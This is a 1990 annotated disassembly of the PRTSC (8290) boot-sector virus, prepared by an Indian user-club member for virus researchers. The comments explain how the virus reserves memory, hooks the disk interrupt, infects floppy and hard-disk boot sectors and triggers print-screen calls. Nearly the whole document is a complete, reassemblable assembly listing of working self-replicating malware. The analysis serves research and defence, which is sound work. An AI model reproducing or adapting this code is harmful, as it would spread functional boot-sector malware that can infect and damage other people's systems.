

(C) Microcomputer Users' Club, 1990


  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        PRTSC(8290) Virus                        ÛÛ
;ÛÛ	Disassembled by Neville Bulsara 		                 ÛÛ
;ÛÛ      Created:   9-Apr-90					         ÛÛ
;ÛÛ      Code type: zero start					         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  

; Note : - This is the disassembled code of the PRTSC (8290) virus which
;          was detected in the month of November 89. It is the first
;          Indian virus to be **released**. 

;          There are two versions floating around. The difference in the
; 	   two is explained further along the line.

;          The virus is small - barely 512 bytes in length. I had hacked the
;          hell out of the code with Microsoft's symbollic debugger (SYMDEB)
;          in November itself. This document is created using Sourcer for
;          purposes of clarity.

;          All virus related comments are mine. My idea is that the chap
;	   who wrote the program was basically experimenting and released
;          the program in a hurry. This may explain the bug which is the
;          basic difference in the two versions. Version 2  has the bug
;          removed. Also, from my observation of an infected system and
;          study of the code itself, it seems that the author has left
;          much to be desired ( If I was the type who enjoyed myself
;          at other folks' expense & if I wanted my code to get far, I would
;          certainly not write such code !). The viruse's disk interrupt 
;          handler is so inefficient - it stinks ! This results in a hard
;          disk slowing down like anything.

;          This document is meant for circulation amongst *responsible*
; 	   people engaged in research into computer viruses. Please
;          make sure that it does not fall into the wrong hands.



;         					Yours sincerely,
;
;						Neville Bulsara
;						Microcomputer Users' Club
;						Bombay - India
			



          ; The following three are data names given to variables  
  
data_2e		equ	6Fh				; 
data_3e		equ	12Eh				;
 
data_12e	equ	413h				;  This variable holds 
							; the total amount of
							; memory installed in 
							; the system. The virus
							; uses it to find out
							; where it should lie
							; in memory. Once the
							; virus is installed,
							; the virus reduces
							; the contents of this
							; location by 2.
							
							

  
codeseg		segment
		assume	cs:codeseg, ds:codeseg
  
  
		org	0
  
PRTSC		proc	far


  
start:
		; Upon booting from a floppy disk, the bootstrap loader
		; is read into memory and given control at a fixed address.
		; In the case of an infected disk, the code below is loaded
		; and given control. The entry point is 'start'.
			

		jmp	short loc_2			; (0023)
		
		
		; The above instruction jumps past the following 23 bytes
		; These bytes include the OEM signature, the BIOS parameter
		; block etc, of the ORIGINAL boot record which are faithfully
		; reproduced by the virus.
		
		
		nop
		push	ax
		inc	bx
		and	ds:data_2e[si],dl		; (7493:006F=0B9h)
		db	6Fh, 6Ch, 73h, 0, 2, 2
		db	1, 0, 2, 70h, 0, 0D0h
		db	2, 0FDh, 2, 0, 9, 0
		db	2, 0
		db	7 dup (0)

loc_2:

		; Control comes here from the jump statement above.
		; The virus first resets the stack ( Standard Housekeeping)

		cli					; Disable interrupts
		xor	ax,ax				; Zero register
		mov	ss,ax
		mov	sp,0F000h
		push	ds
		push	ss
		pop	ds


		; The following 3 lines of code show how the virus
		; looks at a predefined location in RAM, initialized by
		; the ROM BIOS during the POST routine to find out how
		; much memory is installed in the system. The virus then
		; reduces the amount by 2 and updates the memory location
		; This results in total memory reported by DOS being shown
		; as a value 2KB less than actually installed
		

		mov	ax,ds:data_12e			; get Total Ram Size
		sub	ax,2				; decrease by 2
		mov	ds:data_12e,ax			; and update it


		; The following lines of code exhibit how the virus
		; after having determined the memory size, copies itself
		; (512 bytes) to the top of memory -
		; i.e. if there was 640KB to begin with, the virus is
		; copied to memory location 638K.
		

		mov	cl,6
		shl	ax,cl				; Shift w/zeros fill
		mov	es,ax
		xor	di,di				; Zero register
		mov	si,7C00h
		mov	cx,200h
		cld					; Clear direction
		repne	movsb				; Rep while cx>0 Mov [si] to es:[di]


		; the following lines of code show how the virus 'hooks'
		; on to the disk interrupt, while saving the address of the
		; original disk interrupt at an address for a unused interrupt
		; This unused interrupt incidently, is the same one used by
		; the Brain virus. 
		
		; In short, the virus ensures that all subsequent requests
		; for disk i/o are redirected to the virus itself so that
		; it may propagate
		

		mov	di,1B4h
		mov	si,4Ch
		mov	ax,[si]
		mov	[di],ax
		mov	ax,[si+2]
		mov	[di+2],ax
		mov	bx,95h
		mov	ax,es
		mov	[si],bx
		mov	[si+2],ax
		sti					; Enable interrupts


		; now that the virus has copied itself into high memory,
		; and taken over the disk interrupt, the virus then executes
		; the lines below which do nothing but give control to the
		; COPY of the virus in high memory
		
		
		push	es
		mov	ax,69h
		push	ax
		retf					; Return far

;------------ This marks the end of the virus executing in low memory


	; All the code below is executed in high memory
	;    either via 
	;       a) the 'retf' instruction above which jumps to the code
	;           below the first time the virus is loaded on so that
	;	    the original boot record may be infected or
		
	;	b) via the disk interrupt   
		   
;---------------------------------------------------------------------


		; control comes here from the retf instruction above
		; This section of code is executed only once - that
		; is during the process of loading up. It's sole task
		; being to load the original boot record and give
		; it control, thus loading the operating system
		
		
		; this section of code resets the disk system, fills
		; in certain registers to indicate what sector will be 
		; read ( this information is obtained from internal variables
		; filled up by the virus when it copies itself to a disk)
		; As such, from a floppy disk, Cylinder 0 Head 1 Sector 3
		; is read. For a hard disk, Cylinder 1 Head 3 Sector 13
		; is read.

		; These sectors will hold the original boot sector. They
		; are hence read into memory and given control by the virus
		; and presto - the OS is loaded or a Non-system disk message
		; is flashed. But by that time the virus is active in memory.
		

		; The virus tries the read function 4 times in case errors
		; are encountered. If the error occurs more than 4 times,
		; ROM BASIC is invoked. On non-compatibles, this could
		; result in a system lock-out.
		
				

		xor	ax,ax				; Zero register
		mov	es,ax
		push	cs
		pop	ds
		mov	cx,4
		push	cx
		xor	ah,ah				; Zero register
		int	6Dh				; 'm'
		mov	bx,7C00h
		mov	ax,201h
		mov	dh,data_6			; (7493:015C=1)
		mov	cx,data_7			; (7493:015D=3)
		int	6Dh				; 'm'
		jnc	loc_10				; Jump if carry=0
		pop	cx
		loop	loc_11				; Loop if cx > 0
  
		int	18h				; ROM basic


loc_10:
		pop	cx
		pop	ds
		jmp	far ptr loc_1			; (0000:7C00)




		; The code below is executed whenever ANY disk i/o routine
		; is invoked. Control comes to the code below in high memory
		


		; The virus checks to see if it is a read request. If not,
		; the virus does not bother and passes control to the 
		; ROM code ( or another virus which may have loaded on earlier
		; ) to do the needfull.
				


		push	ds
		push	cs
		pop	ds
		cmp	ah,2
		jne	loc_3				; Jump if not equal


		; Control comes here if it was a read request.
		; The virus first does some standard housekeeping
		; such as saving all registers etc.
				

		push	ax
		cli					; Disable interrupts
		mov	ax,ss
		mov	data_4,ax			; (7493:0158=12Eh)
		mov	data_5,sp			; (7493:015A=802h)
		mov	ax,cs
		mov	ss,ax
		mov	sp,7D0h
		sti					; Enable interrupts
		push	es
		push	bx
		push	si
		push	di
		push	cx
		push	dx
		push	cs
		pop	es

		; it then jumps to loc_4 

		jmp	short loc_4			; (00BD)




loc_3:

		; control comes here ( part of loc_3 ) if the function
		; was not a read function. The instruction below just
		; transfers control to loc_8 which passes control to the ROM
		; to do whatever was to be done
		
		jmp	loc_8				; (0150)



loc_4:

		; control comes here if the function was a read function
		; after the standard housekeeping is done

		; The virus determines whether the disk under consideration is 
		; a hard disk or a floppy disk
		
		

		mov	data_10,dl
		mov	di,15Ch
		mov	bx,171h
		test	dl,80h

		; if it is a hard disk, control is transfered to 
		;  loc_5

		jz	loc_5				; Jump if zero


		; Control comes here if it is a hard disk,
		; so the virus prepares to read the DOS boot sector from
		; a HARD DISK
		

		mov	al,3
		stosb					; Store al to es:[di]
		mov	ax,10Dh
		mov	dh,1


		; and then jumps to loc_6 whcih will read the sector
		

		jmp	short loc_6

loc_5:


		; control comes here if it's  a floppy disk. The virus
		; prepares to read the DOS boot sector from the same.
		
		
		mov	al,1
		stosb					; Store al to es:[di]
		mov	dh,0
		mov	ax,3


loc_6:

		; The code below actually reads the sector determined
		; above into memory
		

		stosw					; Store ax to es:[di]
		mov	al,dh
		stosb					; Store al to es:[di]
		mov	ax,201h
		mov	cx,1
		int	6Dh				; 'm'
		jc	loc_7				; Jump if carry Set

		
		; control comes here if there was no error on reading
		; The virus compares the bytes at offset 156h for it's
		; internal signature of 8290. If the signature is found,
		; control goes to loc_7


		mov	si,156h
		mov	ax,[si]
		add	si,171h
		cmp	ax,[si]
		je	loc_7				; Jump if equal

		; The code below is executed if the signature is
		; not found. The virus basically writes the boot sector
		; that was read to Cyl 0 Head 0 Sect 3 on a floppy disk
		; or Cyl 1 Head 1 Sect 13 on a hard disk
		
		

		xor	ax,ax				; Zero register
		int	6Dh				; 'm'
		mov	ax,301h
		mov	dh,data_6			
		mov	dl,data_10			
		mov	cx,data_7			
		mov	bx,171h
		int	6Dh				; 'm'
		jc	loc_7				; Jump if carry Set
		
		
		; Control comes here after the original boot sector
		; has been copied to it's target destination from above.
		; The section of code below copies all messages 
		; found in the original boot record into the viruses own
		; code.
		
		
		mov	si,174h
		mov	di,3
		mov	cx,20h
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		mov	ax,171h
		sub	ax,di
		add	si,ax
		mov	di,171h
		mov	cx,8Fh
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]

		; the section of code below copies the viruses own code
		; along with the messages reproduced onto the DOS boot sector
		

		xor	bx,bx				; Zero register
		mov	ax,301h
		mov	dh,data_8			; (7493:015F=0)
		mov	cx,1
		int	6Dh				; 'm'



loc_7:


		; control comes here either after the virus copies itself
		; onto a disk or if the virus determines that the disk is
		; already infected.
		
		; This code is the viruses exit code. It passes control
		; to the ROM BIOS to do whatever was requested in the first
		; place (read/write/format etc.). But, first the virus
		; calls subroutine sub_1
		
		
		call	sub_1				; (0162)

		; after calling routine sub_1, the virus cleans up the
		; mess that it had done ( restores the registers etc.)
		; and passes control to the bios to do what was requested.
		
		
		pop	dx
		pop	cx
		pop	di
		pop	si
		pop	bx
		pop	es
		cli					; Disable interrupts
		mov	ax,data_4			; (7493:0158=12Eh)
		mov	ss,ax
		mov	sp,data_5			; (7493:015A=802h)
		sti					; Enable interrupts
		pop	ax
loc_8:
		pop	ds
		int	6Dh				; 'm'
		retf	2				; Return far

		adc	byte ptr ds:data_3e[bx+si],2	; (7493:012E=0DBh)
		or	[bx+di],al

data_7		dw	3
data_8		db	0
data_9		db	20h
data_10		db	0
  
PRTSC		endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near


		; The routine below does the following
	
		;   a) Get the contents of data_9 into a register and
		;      decrease it by one
	
		mov	al,data_9			; (7493:0160=20h)
		dec	al

		;   b) If the result is not zero (will be zero after every
		;      256 i/o operations ), jump to loc_ret_9
		

		jnz	loc_ret_9			; Jump if not zero

		;   c) Control comes here if the result is zero,
		;      so print the screen (PRTSC - get it ?? ),
		;      make the value 255 and store it back to it's location
		
		int	5				; Print screen (status at 50:0h)


		dec	al
		mov	data_9,al			; (7493:0160=20h)
  
loc_ret_9:

		;   d) return back

		retn
sub_1		endp
  
  
  		;--------------    NOTE ----------------------
		;    
		;     examine the code above : Initially if the value is
		;     not zero, the routine returns - WITHOUT updating
		;     the location data_9 with the register content.
		;     Hence a value of zero is never reached. This is
		;     the bug in version 1 which has been rectified in
		;     version 2.
		;-------------------------------------------------------
		
		
		; Thee code/data below is redundant
		

		
  
		dec	di
		push	bx
		and	[bx+si],ah
		inc	bx
		dec	di
		dec	bp
		dec	cx
		dec	di
		and	[bx+si],ah
		and	[bx+si],ah
		and	[bx+si],ah
		push	bx
		pop	cx
		push	bx
		dec	bp
		push	bx
		inc	sp
		dec	di
		push	bx
		and	[bx+si],ah
		and	[bp+di+59h],dl
		push	bx
		or	cl,[di]
		inc	sp
		db	'isk Boot Failure'
		db	0
		db	0Ah, 0Dh, 'Non-System disk or dis'
		db	'k error'
		db	0
		db	0Ah, 0Dh, 'Replace and press any '
		db	'key when ready', 0Ah, 0Dh
		db	0, 0
		db	18 dup (0)
		db	55h, 0AAh
  
codeseg		ends
  
  
  
		end	start

